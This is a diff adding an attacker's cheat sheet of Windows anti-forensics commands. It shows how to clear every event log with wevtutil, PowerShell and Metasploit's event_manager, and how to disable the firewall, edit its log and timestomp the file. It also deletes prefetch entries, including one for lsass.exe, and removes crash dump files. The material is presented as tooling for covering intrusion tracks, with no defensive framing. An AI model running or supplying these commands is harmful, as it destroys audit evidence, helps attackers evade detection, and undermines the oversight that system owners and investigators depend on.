@@ -1,0 +1,34 @@
+#boom boom event log
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+#powershell clear event log
+wevtutil el | foreach-object {wevtutil cl "$_"}
+clear-eventlog -log application,system
+
+#metasploit clear event logs
+run event_manager -c security
+
+#windows firewall
+netsh firewall show logging
+#find pfirewall.log
+findstr "ip" C:\pfirewall.log
+findstr /V "HH:MM" C:\pfirewall.log > outfile
+netsh firewall set opmode disable
+#find timestamp
+dir /T:W C:\pfirewall.log 
+type outfile | find /c /v ""
+#find last write
+more outfile +1087 
+move out C:\pfirewall.log
+#msf
+timestomp C:\pfirewall.log -m "05/05/2099 23:23:23"
+netsh firewall set opmode enable
+
+#prefetch find what may be realted
+dir C:\windows\prefetch /A /o:d /t:w
+rm lsass.exe-123123.pf
+
+# Error dumps
+dir c:\*.*dmp /S /A
+dir c:\*.*wer /S /A
+rm user.dmp
